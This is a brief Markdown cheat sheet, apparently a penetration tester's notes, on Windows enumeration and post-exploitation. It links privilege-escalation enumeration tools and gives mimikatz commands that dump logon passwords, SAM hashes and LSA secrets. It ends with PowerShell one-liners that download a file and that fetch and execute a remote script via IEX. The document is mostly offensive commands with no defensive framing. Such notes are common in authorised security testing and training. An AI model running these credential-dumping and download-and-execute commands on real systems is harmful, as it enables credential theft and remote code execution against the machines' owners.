# Windows
**work in progress**

- [Windows](#windows)
  - [Enumeration](#enumeration-on-windows)
  - [Mimikatz](#mimikatz)
  - [Other](#other)
  - [Privilege Escalation](#)

## Enumeration on windows
Automated enumeration tools:
- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [SharpUp](https://github.com/GhostPack/SharpUp)
- [Watson](https://github.com/rasta-mouse/Watson)

## Mimikatz
- [mimikatz](https://github.com/gentilkiwi/mimikatz)

### Check for correct privilege
```bash
mimikatz $ privilege::debug
```

### Extract logon passwords / hashes
```bash
mimikatz $ sekurlsa::logonpasswords
# OR
mimikatz $ lsadump::sam
# OR
mimikatz $ lsadump::secrets
```

## Other
Some useful stuff.

### Powershell: download files
```powershell
Invoke-WebRequest <URL> -Outfile <PATH>
```

### Powershell: download and execute file
```powershell
IEX(New-Object Net.WebClient).downloadString("URL")
```
